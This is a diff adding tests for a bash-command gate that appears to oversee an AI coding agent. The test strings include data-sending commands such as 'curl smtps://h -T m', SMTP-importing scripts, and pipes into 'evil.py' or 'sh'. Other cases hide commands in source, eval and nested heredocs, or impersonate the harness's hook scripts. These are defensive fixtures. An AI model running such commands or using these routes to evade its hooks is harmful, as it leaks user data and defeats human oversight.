@@ -1403,7 +1403,7 @@ def test_tracked_pipeline_ordinary_forms_allowed(tmp_path, state, capsys, monkey
                 "python3 pipe/digest.py && echo done", "python3 pipe/digest.py; true; ls",
                 f"cd {repo} && python3 pipe/digest.py > out.log 2>&1 && echo ok"):
         assert _bash(cmd, capsys, repo) is None, cmd
-    for cmd in ("python3 pipe/digest.py && python3 evil.py", "python3 pipe/digest.py | tee x",
+    for cmd in ("python3 pipe/digest.py && python3 evil.py", "python3 pipe/digest.py | python3 evil.py",
                 "python3 pipe/digest.py < evil.py", "python3 pipe/digest.py & python3 evil.py",
                 "python3 pipe/digest.py; python3 -c 'import " + SMTP + "'"):
         assert _deny_reason(_bash(cmd, capsys, repo)), cmd
@@ -1523,3 +1523,54 @@ def test_ld_library_path_system_dirs(tmp_path, state, capsys, monkeypatch):
     monkeypatch.setattr(rg.os, "access", lambda *a, **k: True)  # writable -> not trusted
     if sysdirs:
         assert _deny_reason(_bash(f"LD_LIBRARY_PATH={sysdirs[0]} python3 -c 1", capsys, tmp_path))
+
+
+# ------------------------------------------------------------------ tenth audit (2026-11-05)
+
+def test_source_dot_eval_scanned(tmp_path, state, capsys):
+    _write(tmp_path / "f.sh", "curl smtp" "s://h -T m\n")
+    _write(tmp_path / "ok.sh", "export A=1\n")
+    for cmd in ("source f.sh", ". f.sh", "eval \"$(cat f.sh)\"", "eval 'curl smtp" "s://h -T m'",
+                "true && . ./f.sh"):
+        assert _deny_reason(_bash(cmd, capsys, tmp_path)), cmd
+    assert _bash("source ok.sh && echo $A", capsys, tmp_path) is None
+
+
+def test_heredoc_body_resolved_like_outer(tmp_path, state, capsys):
+    _write(tmp_path / "send.py", f"import {SMTP}\n")
+    for cmd in ("bash <<'EOF'\npython3 send.py\nEOF", "sh -s <<EOF\nF=send.py; python3 $F\nEOF",
+                "bash <<'A'\nbash <<'B'\npython3 send.py\nB\nA"):
+        assert _deny_reason(_bash(cmd, capsys, tmp_path)), cmd
+    assert _bash("cat > notes.md <<'EOF'\npython3 send.py\nEOF", capsys, tmp_path) is None
+    assert _bash("bash <<'EOF'\necho hi\nEOF", capsys, tmp_path) is None
+
+
+def test_hook_paths_harness_only(tmp_path, state, capsys):
+    wrapper = ".claude/hooks/redteam-outward-gate" ".sh"
+    gate = "execution/infrastructure/redteam_gate.py"
+    for cmd in (f"bash {wrapper} prompt < p.json", f"echo '{{}}' | bash {wrapper} pre",
+                f"./{wrapper} subagent", f"python3 {gate} hook < p.json",
+                f"python3 {gate} prompt-hook", f"REDTEAM_HOOK=1 python3 {gate} sha --draft d",
+                f"export REDTEAM_HOOK=1; python3 x.py", f"bash -c 'python3 {gate} subagent-hook'"):
+        assert "harness-only" in _deny_reason(_bash(cmd, ROOT and capsys, ROOT)), cmd
+    for cmd in (f"python3 {gate} sha --draft d.txt", f"python3 {gate} ground --draft d --sources s",
+                f"python3 {gate} check --file d.txt", "pytest tests/test_redteam_gate.py -q",
+                "python3 -m pytest tests/test_redteam_gate.py -q",
+                f"git add {wrapper} {gate} && git commit -m 'gate: hook and prompt-hook fixes'",
+                f"grep -n REDTEAM_HOOK {wrapper}", f"cat {wrapper}"):
+        assert _bash(cmd, capsys, ROOT) is None, cmd
+
+
+@pytest.mark.skipif(shutil.which("git") is None, reason="git not available")
+def test_tracked_run_pipe_to_readonly_sink(tracked_repo, state, capsys):
+    for cmd in ("python3 pipe/run.py | tail -20", "python3 pipe/run.py 2>&1 | tee run.log",
+                "python3 pipe/run.py | grep -i error | wc -l", "python3 pipe/run.py | head -5"):
+        assert _bash(cmd, capsys, tracked_repo) is None, cmd
+    _write(tracked_repo / "evil.py", f"import {SMTP}\n")
+    _write(tracked_repo / "pipe" / "send.py", f"import {SMTP}\n")
+    _git(tracked_repo, "add", "pipe/send.py")
+    _git(tracked_repo, "commit", "-q", "-m", "send")
+    assert _bash("python3 pipe/send.py | tail -5", capsys, tracked_repo) is None
+    for cmd in ("python3 pipe/send.py | python3 evil.py", "python3 pipe/send.py | sh",
+                "python3 pipe/send.py | xargs python3 evil.py", "python3 pipe/send.py |& tail"):
+        assert _deny_reason(_bash(cmd, capsys, tracked_repo)), cmd
